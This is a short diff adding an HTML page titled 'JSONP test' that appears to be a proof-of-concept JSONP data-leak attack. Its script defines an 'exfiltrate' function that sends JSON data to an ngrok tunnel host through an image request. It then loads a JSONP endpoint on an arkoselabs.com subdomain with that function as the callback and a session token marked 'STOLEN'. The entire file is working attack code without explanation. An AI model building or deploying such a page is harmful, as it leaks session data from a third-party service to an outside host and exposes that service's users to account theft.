@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script>
+function exfiltrate(data) {
+  new Image().src = 'https://terrapin-gentle-katydid.ngrok-free.app/log?data=' + encodeURIComponent(JSON.stringify(data));
+}
+</script>
+<script src="http://gitlab-api.arkoselabs.com/fc/a/?callback=exfiltrate&category=loaded&action=game+loaded&session_token=STOLEN"></script>
+</head>
+<body>
+<h1>JSONP test</h1>
+</body>
+</html>
